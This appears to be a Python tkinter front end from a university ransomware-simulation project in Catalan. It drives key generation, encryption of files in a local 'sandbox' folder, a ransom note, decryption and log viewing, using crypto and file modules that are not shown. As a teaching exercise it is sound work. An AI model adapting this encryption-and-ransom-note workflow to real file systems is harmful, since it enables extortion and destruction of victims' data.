
import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import crypto_engine
import file_manager


RUTA_SANDBOX = "sandbox"
RUTA_CLAU = "config_sys_04.dat"
EXTENSIONS_OK = [".py", ".exe", ".dat", ".locked"] 

class AplicacioHacker:
    def __init__(self, finestra):
        self.finestra = finestra
        self.finestra.title("TERMINAL DE CIBERSEGURETAT - ENTI UB")
        self.finestra.geometry("1000x600")
        self.finestra.resizable(False, False)
        
        
        self.color_fons = "#000000"  # Negre pur
        self.color_text = "#00FF00"  # Verd Matrix
        self.color_boto = "#1a1a1a"  # Gris molt fosc
        
        self.finestra.configure(bg=self.color_fons)
        self.pantalla = None
        self.pantalla_inici()

    def netejar(self):
        if self.pantalla:
            self.pantalla.destroy()

    # --- PANTALLA 1: INICI ---
    def pantalla_inici(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")

        tk.Label(self.pantalla, text="GENERADOR DE RANSOMWARE", 
                 fg=self.color_text, bg=self.color_fons, 
                 font=("Consolas", 24, "bold")).pack(pady=60)
        
        tk.Label(self.pantalla, text="MARC FERNANDEZ - MARTI OLIVER", 
                 fg=self.color_text, bg=self.color_fons, 
                 font=("Consolas", 14)).pack(pady=10)
        
        tk.Label(self.pantalla, text="ENTI - UNIVERSITAT DE BARCELONA", 
                 fg=self.color_text, bg=self.color_fons, 
                 font=("Consolas", 12)).pack(pady=5)

        tk.Label(self.pantalla, text="[ ** PREM ESPAI PER ACCEDIR AL SISTEMA ** ]", 
                 fg="#ffffff", bg=self.color_fons, 
                 font=("Consolas", 16)).pack(pady=120)

        self.finestra.bind("<space>", self.anar_a_menu)

    def anar_a_menu(self, event):
        self.finestra.unbind("<space>")
        self.pantalla_menu()

    # --- PANTALLA 2: MENU PRINCIPAL ---
    def pantalla_menu(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")

        tk.Label(self.pantalla, text="--- MAIN CONTROL PANEL ---", 
                 fg=self.color_text, bg=self.color_fons, 
                 font=("Consolas", 20, "bold")).pack(pady=40)

        opcions = [
            ("1. EXECUTAR INFECCIO", self.accions_infectar),
            ("2. RECUPERAR DADES", self.accions_recuperar),
            ("3. CONSULTAR LOGS", self.accions_historial),
            ("4. TANCAR TERMINAL", self.finestra.quit)
        ]

        for text, comanda in opcions:
            tk.Button(self.pantalla, text=text, width=30, height=2,
                      bg=self.color_boto, fg=self.color_text, 
                      font=("Consolas", 12, "bold"),
                      command=comanda).pack(pady=10)

    # --- PANTALLA 3: CONSOLA DE SORTIDA ---
    def crear_consola(self, titol):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        
        tk.Label(self.pantalla, text=f"> {titol}", 
                 fg=self.color_text, bg=self.color_fons, 
                 font=("Consolas", 14)).pack(pady=10)
        
        text = scrolledtext.ScrolledText(self.pantalla, width=85, height=22, 
                                         bg="#050505", fg=self.color_text, 
                                         font=("Consolas", 10))
        text.pack(pady=10, padx=10)
        
        tk.Button(self.pantalla, text="[ RETORN AL MENU ]", 
                  bg=self.color_boto, fg=self.color_text, 
                  font=("Consolas", 10), command=self.pantalla_menu).pack(pady=5)
        return text

    def accions_infectar(self):
        c = self.crear_consola("RUNNING MALWARE SIMULATION...")
        try:
            if not os.path.exists(RUTA_SANDBOX):
                messagebox.showerror("CRITICAL ERROR", "Directori sandbox no trobat") # SDR-30
                return
            
            c.insert(tk.END, "Generant clau binaria...\n")
            crypto_engine.generar_i_guardar_clau(RUTA_CLAU)
            clau = crypto_engine.carregar_clau(RUTA_CLAU)
            
            fitxers = file_manager.llistar_fitxers(RUTA_SANDBOX)
            for f in fitxers:
                if not any(f.endswith(ex) for ex in EXTENSIONS_OK):
                    crypto_engine.xifrar_arxiu(f, clau)
                    c.insert(tk.END, f"SUCCESS: Fitxer {os.path.basename(f)} xifrat\n")
            
            file_manager.generar_nota_rescat(RUTA_SANDBOX)
            c.insert(tk.END, "\n--- PROCES FINALITZAT AMB EXIT ---")
        except Exception as e:
            c.insert(tk.END, f"\nFATAL ERROR: {e}")

    def accions_recuperar(self):
        c = self.crear_consola("DECRYPTING DATA...")
        clau = crypto_engine.carregar_clau(RUTA_CLAU)
        if not clau:
            messagebox.showwarning("ACCES DENEGAT", "Falta la clau de desencriptacio")
        else:
            fitxers = file_manager.llistar_fitxers(RUTA_SANDBOX)
            for f in fitxers:
                if f.endswith(".locked"):
                    crypto_engine.desxifrar_arxiu(f, clau)
                    c.insert(tk.END, f"RESTORED: {os.path.basename(f)}\n")

    def accions_historial(self):
        c = self.crear_consola("ACCESSING SYSTEM LOGS...")
        if os.path.exists(file_manager.RUTA_LOGS):
            with open(file_manager.RUTA_LOGS, "r") as f:
                c.insert(tk.END, f.read())

if __name__ == "__main__":
    root = tk.Tk()
    AplicacioHacker(root)
    root.mainloop()
